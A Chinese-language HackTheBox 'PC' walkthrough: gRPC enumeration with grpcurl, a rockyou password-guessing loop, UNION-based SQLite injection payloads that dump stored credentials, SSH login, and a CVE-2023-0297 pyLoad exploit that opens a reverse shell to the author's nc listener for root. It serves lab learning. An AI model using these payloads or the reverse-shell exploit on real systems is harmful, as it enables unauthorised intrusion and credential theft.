---
tags:
  - HTB/Linux
  - HTB/Easy
---

**由于有部分是边写边打，有部分是打了后写，所以靶机IP和payload细节（如id、token的值）会有差异。**

---

## 扫描

一开始惯例只扫了1-10000端口，发现只有22就感觉不对。于是索性扫了全TCP和UDP端口。结果只有TCP端口开放了。

- 22
- 50051

## 漏洞分析

### 50051端口

谷歌了一下似乎是gRPC的默认端口。然后，然后就卡住了……

在群里师傅的提点下了解到了 `grpcui` 这个工具，不过没咋弄懂……  
倒是给我打开了思路。就像postman，原来找到和grpc服务器交互、调试的方法就好，于是谷歌搜了下“grpc debug”，在[这篇文章](https://medium.com/@EdgePress/how-to-interact-with-and-debug-a-grpc-server-c4bc30ddeb0b)中看到许多工具。  
*后来才发觉原来postman也能调试grpc，一直以为只是搞REST API的。*

稍微看了看感觉还是 `grpcurl` 使用上较简单。网上也有许多基础使用教程，直接看gitlab文档也不错。

*由于不大想安装很杂的东西到kali，本来想着用docker安装，不过run的时候报错不是很懂……留个坑，报错信息：*
```bash
└─$ docker run fullstorydev/grpcurl host.docker.internal:443 list
Failed to dial target host "host.docker.internal:443": context deadline exceeded
```

结果还是选择安装到kali……  
不过下载之后才发现原来只是个二进制文件啊……挺好  

#### grpcurl枚举信息

然后根据grpc的文档开始整起来：
```bash
└─$ ./grpcurl -plaintext 10.129.40.24:50051 list
SimpleApp
grpc.reflection.v1alpha.ServerReflection

└─$ ./grpcurl -plaintext 10.129.40.24:50051 describe              
SimpleApp is a service:
service SimpleApp {
  rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );
  rpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse );
  rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );
}
grpc.reflection.v1alpha.ServerReflection is a service:
service ServerReflection {
  rpc ServerReflectionInfo ( stream .grpc.reflection.v1alpha.ServerReflectionRequest ) returns ( stream .grpc.reflection.v1alpha.ServerReflectionResponse );
}
```

#### grpcurl调用方法

```bash
└─$ ./grpcurl -plaintext 10.129.40.24:50051 SimpleApp/getInfo
{
  "message": "Authorization Error.Missing 'token' header"
}

└─$ ./grpcurl -plaintext 10.129.40.24:50051 SimpleApp/LoginUser
{
  "message": "Login unsuccessful"
}

└─$ ./grpcurl -plaintext 10.129.40.24:50051 SimpleApp/RegisterUser
{
  "message": "username or password must be greater than 4"
}
```

感觉可以先注册一个用户然后试试登陆？  
具体需要什么参数可以用 `describe` 查看：
```bash
└─$ ./grpcurl -plaintext 10.129.40.24:50051 describe .RegisterUserRequest          
RegisterUserRequest is a message:
message RegisterUserRequest {
  string username = 1;
  string password = 2;
}

└─$ ./grpcurl -plaintext -d '{"username":"test1", "password":"123456"}' 10.129.40.24:50051 SimpleApp/RegisterUser
{
  "message": "Account created for user test1!"
}

└─$ ./grpcurl -plaintext -d '{"username":"test1", "password":"123456"}' 10.129.40.24:50051 SimpleApp/LoginUser   
{
  "message": "Your id is 53."
}

└─$ ./grpcurl -plaintext 10.129.40.24:50051 describe .getInfoRequest    
getInfoRequest is a message:
message getInfoRequest {
  string id = 1;
}

└─$ ./grpcurl -plaintext -d '{"id":"53"}' 10.129.40.24:50051 SimpleApp/getInfo 
{
  "message": "Authorization Error.Missing 'token' header"
}
```

注册、登陆倒是成功了，不过卡在这……不知道这是啥意思。试了下 `-H` 加报头也没用……  
谷歌了各种关于报头和认证的debug，第二天接着来尝试了包括但不限于下面的各种组合，结果都报同一种错
```bash
└─$ ./grpcurl -plaintext -H 'token:dGVzdDE6MTIzNDU2' -d '{"id":"470"}' 10.129.40.145:50051 SimpleApp/getInfo

└─$ ./grpcurl -plaintext -H 'Authorization:Bearer dGVzdDE6MTIzNDU2' -d '{"id":"470"}' 10.129.40.145:50051 SimpleApp/getInfo

└─$ ./grpcurl -plaintext -rpc-header 'Authorization:Bearer dGVzdDE6MTIzNDU2' -d '{"id":"470"}' 10.129.40.145:50051 SimpleApp/getInfo
```

至于上面的token字符串是怎么来的，这是我自己弄的base64编码……因为好像搜关于token认证时看到说是这样编码的……
```bash
└─$ echo -n "test1:123456" |base64
dGVzdDE6MTIzNDU2
```

后来实在不行我都怀疑是不是因为token过期啥的，于是就又从头搞了一遍，才发现自己编码token真是傻了……

这次真是也是偶然。  
在之前的各种尝试中都没加上 `-vv`，导致错过了重要信息。后来参考各种grpcurl命令的使用说明时才无意中加了这个选项。  
所以这次重新来一遍才发现原来登陆成功后服务器有返回token字符串：
```bash
└─$ ./grpcurl -vv -plaintext -d '{"username":"test1", "password":"123456"}' 10.129.40.145:50051 SimpleApp/RegisterUser

Resolved method descriptor:
rpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse );

Request metadata to send:
(empty)

Response headers received:
content-type: application/grpc
grpc-accept-encoding: identity, deflate, gzip

Estimated response size: 33 bytes

Response contents:
{
  "message": "Account created for user test1!"
}

Response trailers received:
(empty)
Sent 1 request and received 1 response
                                                                                                                   
└─$ ./grpcurl -vv -plaintext -d '{"username":"test1", "password":"123456"}' 10.129.40.145:50051 SimpleApp/LoginUser 

Resolved method descriptor:
rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );

Request metadata to send:
(empty)

Response headers received:
content-type: application/grpc
grpc-accept-encoding: identity, deflate, gzip

Estimated response size: 17 bytes

Response contents:
{
  "message": "Your id is 655."
}

Response trailers received:
token: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdDEiLCJleHAiOjE2ODQ4MTQ5Mzl9.qp1J8frK9Hdn6_i0Q00uLTG9Y77omoCfGqwalRZRiyw'
Sent 1 request and received 1 response
```
想想也是哦……就类比HTTP的响应，token这种信息不也是在放报头而不是响应体里嘛……

用它响应的token倒是解决了之前的报错，但是出现了新问题：
```bash
└─$ ./grpcurl -vv -plaintext -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdDEiLCJleHAiOjE2ODQ4MTQ5Mzl9.qp1J8frK9Hdn6_i0Q00uLTG9Y77omoCfGqwalRZRiyw' -d '{"id":"655"}' 10.129.40.145:50051 SimpleApp/getInfo

Resolved method descriptor:
rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );

Request metadata to send:
token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdDEiLCJleHAiOjE2ODQ4MTQ5Mzl9.qp1J8frK9Hdn6_i0Q00uLTG9Y77omoCfGqwalRZRiyw

Response headers received:
(empty)

Response trailers received:
content-type: application/grpc
Sent 1 request and received 0 responses
ERROR:
  Code: Unknown
  Message: Unexpected <class 'TypeError'>: 'NoneType' object is not subscriptable
```

尝试了比如token字符串前面加“Bearer”或者“Basic”，然后用用不同的option，比如-rpc-header。简直就是发挥想象力各种胡乱组合……结果都是报这个错。

由于谷歌也一直没搜出个所以然来，于是干脆将这段丢给chatgpt。  
然后似乎这个报错不是因为我的请求有语法错误，而是因为响应没有值：
> The error message you received indicates that an unexpected error occurred while executing the gRPC request. Specifically, it mentions a TypeError stating that a 'NoneType' object is not subscriptable. This error typically occurs when you attempt to access or index an element of a variable that is None (i.e., it has no value).

于是我就尝试请求其他id而不是我登陆之后服务器给我的那个值，首先当然是最有可能是admin的“1”：
```bash
└─$ ./grpcurl -vv -plaintext -H 'token:eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdDEiLCJleHAiOjE2ODQ4MTQ5Mzl9.qp1J8frK9Hdn6_i0Q00uLTG9Y77omoCfGqwalRZRiyw' -d '{"id":"1"}' 10.129.40.145:50051 SimpleApp/getInfo

Resolved method descriptor:
rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );

Request metadata to send:
token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdDEiLCJleHAiOjE2ODQ4MTQ5Mzl9.qp1J8frK9Hdn6_i0Q00uLTG9Y77omoCfGqwalRZRiyw

Response headers received:
content-type: application/grpc
grpc-accept-encoding: identity, deflate, gzip

Estimated response size: 46 bytes

Response contents:
{
  "message": "The admin is working hard to fix the issues."
}

Response trailers received:
(empty)
Sent 1 request and received 1 response
```

wow，有响应，虽然没有什么用处的样子。又试了一下其他id。结果都返回“NoneType”报错……

然后突然想到是不是真的token有时限，或者说我这个account有时限？  
因为我记得之前为了获取一个新token而尝试过重复登陆，然而明明是我注册过的账号，但是登陆时显示失败。当时还不知道原因来着，于是开始验证。

#### 验证：账户定期清除

首先重现一下Login成功后过几分钟再次login会失败的现象：
```bash
└─$ ./grpcurl -vv -plaintext -d '{"username":"test1", "password":"123456"}' 10.129.40.145:50051 SimpleApp/LoginUser

Resolved method descriptor:
rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );

Request metadata to send:
(empty)

Response headers received:
content-type: application/grpc
grpc-accept-encoding: identity, deflate, gzip

Estimated response size: 17 bytes

Response contents:
{
  "message": "Your id is 174."
}

Response trailers received:
token: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdDEiLCJleHAiOjE2ODQ4MTgzOTZ9.0SOhGBXWGFBLMnC4NkgikFlINXPUYvicLE3GfVHu3EU'
Sent 1 request and received 1 response


└─$ ./grpcurl -vv -plaintext -d '{"username":"test1", "password":"123456"}' 10.129.40.145:50051 SimpleApp/LoginUser

Resolved method descriptor:
rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );

Request metadata to send:
(empty)

Response headers received:
content-type: application/grpc
grpc-accept-encoding: identity, deflate, gzip

Estimated response size: 20 bytes

Response contents:
{
  "message": "Login unsuccessful"
}

Response trailers received:
(empty)
Sent 1 request and received 1 response
```

OK，再看看注册。  
先注册，然后再次注册会告诉我用户已存在。但是放置几分钟之后再注册同一个用户就又成功了：
```bash
└─$ ./grpcurl -vv -plaintext -d '{"username":"test1", "password":"123456"}' 10.129.40.145:50051 SimpleApp/RegisterUser

Resolved method descriptor:
rpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse );

Request metadata to send:
(empty)

Response headers received:
content-type: application/grpc
grpc-accept-encoding: identity, deflate, gzip

Estimated response size: 33 bytes

Response contents:
{
  "message": "Account created for user test1!"
}

Response trailers received:
(empty)
Sent 1 request and received 1 response


└─$ ./grpcurl -vv -plaintext -d '{"username":"test1", "password":"123456"}' 10.129.40.145:50051 SimpleApp/RegisterUser

Resolved method descriptor:
rpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse );

Request metadata to send:
(empty)

Response headers received:
content-type: application/grpc
grpc-accept-encoding: identity, deflate, gzip

Estimated response size: 23 bytes

Response contents:
{
  "message": "User Already Exists!!"
}

Response trailers received:
(empty)
Sent 1 request and received 1 response


└─$ ./grpcurl -vv -plaintext -d '{"username":"test1", "password":"123456"}' 10.129.40.145:50051 SimpleApp/RegisterUser

Resolved method descriptor:
rpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse );

Request metadata to send:
(empty)

Response headers received:
content-type: application/grpc
grpc-accept-encoding: identity, deflate, gzip

Estimated response size: 33 bytes

Response contents:
{
  "message": "Account created for user test1!"
}

Response trailers received:
(empty)
Sent 1 request and received 1 response
```

难道真是因为账户会被删除，导致之后调用id时返回NoneType？  
那就试一下快一点执行命令。
结果：
```bash
Response contents:
{
  "message": "Will update soon."
}

Response trailers received:
(empty)
Sent 1 request and received 1 response
```

*由于WP我一般都是边打编写，似乎因为这样才导致我走了许多弯路。现在看看如果直接一连串先打下去，应该不会发现这个问题……*

#### 一些其他尝试

- 登陆自己注册的号，然后枚举/请求0-500的id。除了之前发现的id 1的admin，以及自己登陆后的id，请求其他id都会返回NoneType
- 于是怀疑是不是要暴破admin，于是用下面的命令跑了一下
```bash
└─$ while read PW; do echo "password":"$PW"; ./grpcurl -plaintext -d '{"username":"admin", "password":"$PW"}' 10.129.40.145:50051 SimpleApp/LoginUser | grep "message" | grep -v "unsuccessful"; done < /usr/share/wordlists/rockyou.txt
```

*其实应该用 `-d @`……`<<EOM` 的方式写，不然参数一直没传到单引号的payload里面。*  
*所以自然这个暴破是无结果的……而且其实我跑了1万多行就开始虚了，感觉要暴破这么久应该不是这条路也就中途放弃了。*  
*但是后来以为是grpcurl不行，就换了postman进行测试。本来只是想看看postman能不能运行，于是随手账户密码都用了“admin”，结果竟然登陆成功……*

#### grpc登陆的admin账户

如上所述，意外之喜偶然发现admin的密码……

本来以为admin账户的话能通过 `getInfo` 得到什么敏感信息，运行了一下命令之后发现返回的信息和以前一样……于是又开始迷茫了……

先分享一下这个脚本，因为总是要登陆获取token然后再调用getInfo。打字很麻烦所以写了这个脚本方便直接获取命令：
```bash
#!/usr/bin/bash

set -u

HTB_IP=$1

#./grpcurl -vv -plaintext -d '{"username":"test123", "password":"123456"}' ${HTB_IP}:50051 SimpleApp/RegisterUser
Login=$(./grpcurl -vv -plaintext -d '{"username":"admin", "password":"admin"}' ${HTB_IP}:50051 SimpleApp/LoginUser)
myID=$(echo ${Login}  | cut -d "\"" -f4 | cut -d " " -f4 | cut -d "." -f1)
token=$(echo ${Login} | cut -d "'" -f2)

echo $Login
echo "ID" $myID
echo "TOKEN" $token

echo "The request you want:"
echo "./grpcurl -vv -plaintext -H 'token: ${token}' -d '{\"id\":\"${myID}\"}' ${HTB_IP}:50051 SimpleApp/getInfo"
```

运行上面的脚本后，执行调用getInfo的命令：
```bash
└─$ ./grpcurl -vv -plaintext -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODUwMDM0NzN9.R_Z6JXS49px42pQwgGdm5gj9-3-p7n9lA28aLLCVq2o' -d '{"id":"70"}' 10.10.11.214:50051 SimpleApp/getInfo

Resolved method descriptor:
rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );

Request metadata to send:
token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODUwMDM0NzN9.R_Z6JXS49px42pQwgGdm5gj9-3-p7n9lA28aLLCVq2o

Response headers received:
content-type: application/grpc
grpc-accept-encoding: identity, deflate, gzip

Estimated response size: 19 bytes

Response contents:
{
  "message": "Will update soon."
}

Response trailers received:
(empty)
Sent 1 request and received 1 response
```

试了一下admin登陆SSH也不行。

其实本身还考虑过是否要利用“grpc.reflection.v1alpha.ServerReflection”，不过从postman发现我能选的只有“SimpleApp”。就姑且不管了。  

#### 发现SQLi

开始琢磨这个id参数能不能注入啥的。  
*下面开始关注payload，所以 `-vv` 选项就省略了*

一开始放个单引号发现不行。考虑好一阵子才想起来最基础的知识，这可能不是字符类型而是数字类型：
```bash
└─$ ./grpcurl -plaintext -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODUwMDM0NzN9.R_Z6JXS49px42pQwgGdm5gj9-3-p7n9lA28aLLCVq2o' -d '{"id":"1"}' 10.10.11.214:50051 SimpleApp/getInfo 
{
  "message": "The admin is working hard to fix the issues."
}

└─$ ./grpcurl -plaintext -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODUwMDM0NzN9.R_Z6JXS49px42pQwgGdm5gj9-3-p7n9lA28aLLCVq2o' -d '{"id":"1 or 1=1"}' 10.10.11.214:50051 SimpleApp/getInfo
{
  "message": "The admin is working hard to fix the issues."
}
```

##### 判断字段数

`-d '{"id":"140 ORDER BY 1--"}'`：无报错。2就报错。其实很明显只有1列就是了。

##### 判断数据库：sqlite3

根据[hacktricks](https://book.hacktricks.xyz/pentesting-web/sql-injection)这里只能判断出不是MySQL。  
不过其实用分号尝试执行多条命令时，可以看到报错信息明确是sqlite3：
```bash
└─$ ./grpcurl -plaintext -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODUwMDM0NzN9.R_Z6JXS49px42pQwgGdm5gj9-3-p7n9lA28aLLCVq2o' -d '{"id":"1 or 1=1; select * from sqlite_master"}' 10.10.11.214:50051 SimpleApp/getInfo
ERROR:
  Code: Unknown
  Message: Unexpected <class 'sqlite3.Warning'>: You can only execute one statement at a time.
```

#### 暴库

确认是sqlite3就好办了，谷歌一下cheatsheet开始暴库：
> [PayloadsAllTheThings/SQL Injection/SQLite Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md)



##### Extract table name

由于payload有单引号所以用 `-d @` 的方式传递

```bash
./grpcurl -plaintext -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODUwMTA4NTh9.n3UwTncslJwqRDFHZb3mzU0bnnaDQKaaDp5mNyMrlOQ' -d @ 10.10.11.214:50051 SimpleApp/getInfo <<EOM 
{"id":"140 union SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'"}
EOM
{
  "message": "accounts"
}
```

##### Extract column name

```bash
└─$ ./grpcurl -plaintext -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODQ5OTEzMDl9.OQuH_s45wDpBp6YaNlrwkX4p1CgSdQoSHSgaNt8ehzg' -d @ 10.10.11.214:50051 SimpleApp/getInfo <<EOM
{"id":"1 union SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='accounts'"}  
EOM
{
  "message": "CREATE TABLE \"accounts\" (\n\tusername TEXT UNIQUE,\n\tpassword TEXT\n)"
}
```

##### 获取密码

`limit 0,1` 即admin。本来想写个脚本枚举id，不过试了下似乎一共就2个用户。

```bash
└─$ ./grpcurl -plaintext -H 'token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiYWRtaW4iLCJleHAiOjE2ODQ5OTEzMDl9.OQuH_s45wDpBp6YaNlrwkX4p1CgSdQoSHSgaNt8ehzg' -d @ 10.10.11.214:50051 SimpleApp/getInfo <<EOM
{"id":"1 union SELECT username ||', '|| password FROM accounts limit 1,1"}
EOM
{
  "message": "sau, HereIsYourPassWord1431"
}
```


## Initial Access

用上面从数据库拿的账号密码登陆ssh成功：
```bash
└─$ ssh sau@10.10.11.214  
The authenticity of host '10.10.11.214 (10.10.11.214)' can't be established.
ED25519 key fingerprint is SHA256:63yHg6metJY5dfzHxDVLi4Zpucku6SuRziVLenmSmZg.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:31: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes 
Warning: Permanently added '10.10.11.214' (ED25519) to the list of known hosts.
sau@10.10.11.214's password: 
Last login: Thu May 25 03:06:26 2023 from 10.xx.xx.xx
```


## flag: user

```bash
sau@pc:~$ pwd
/home/sau
sau@pc:~$ ls
snap  user.txt
sau@pc:~$ cat user.txt 
4eef…………0835
```


## 探索

- 无可执行sudo
- crontab无发现
- SUID无发现
- 家目录无特殊隐藏文件
- hosts文件无发现
- 看主机IP，无多个网卡
- 查看本地开放端口。注意到有53/8000/9666

### 本地端口8000：pyLoad

8000和9666都是同样的结果：
```bash
sau@pc:~$ curl 127.0.0.1:8000
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/login?next=http%3A%2F%2F127.0.0.1%3A8000%2F">/login?next=http%3A%2F%2F127.0.0.1%3A8000%2F</a>. If not, click the link.
```

将响应中的链接解码：/login?next=http://127.0.0.1:8000/

然后再次curl看看，返回一个网页源码：
```bash
sau@pc:~$ curl 127.0.0.1:8000/login?next=http://127.0.0.1:8000/
<!DOCTYPE html>
<html lang="en">
……
<title>Login - pyLoad </title>
……
```

看title注意到是个pyLoad的登陆界面。

本来还弄了个SSH隧道，访问了一下pyLoad网页。  
尝试了一下默认凭据登陆、SQLi，没什么进展。

![pyLoad](./../evidence-img/HTB-PC-SSHtunneling.png)

然后发现原来有[gitlab项目](https://github.com/pyload/pyload)，能运行命令。
```bash
sau@pc:~$ which pyload
/usr/local/bin/pyload
sau@pc:~$ pyload --version
pyLoad 0.5.0
```

知道版本，就搜了下是否有公开漏洞。


## Privilege Escalation

### PoC (CVE-2023-0297)

- [NVD](https://nvd.nist.gov/vuln/detail/CVE-2023-0297)
- [Exp](https://github.com/JacobEbben/CVE-2023-0297/tree/main)

[NVD里有个exp的链接](https://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/)，试了下虽然确实可以创建 `/tmp/pwnd`，不过想给bash加SUID或者执行反弹shell命令就没用……不懂为什么。  
结果还是根据里面写的CVE号码继续搜了搜其他Exp，就找到上面那个Exp，运行后成功get shell。

## flag: root

```bash
└─$ python exp.py -t 127.0.0.1:8000 -c id -I 10.xx.xx.xx -P 81
[SUCCESS] Running reverse shell. Check your listener!

---

└─$ nc -lvnp 81                  
listening on [any] 81 ...
connect to [10.xx.xx.xx] from (UNKNOWN) [10.10.11.214] 48940
bash: cannot set terminal process group (1040): Inappropriate ioctl for device
bash: no job control in this shell
root@pc:~/.pyload/data# id
id
uid=0(root) gid=0(root) groups=0(root)
root@pc:~/.pyload/data# ls
ls
db.version
pyload.db
root@pc:~/.pyload/data# cat /root/root.txt
cat /root/root.txt
bec6…………7110
```


---

## 总结·后记

2023/05/25
……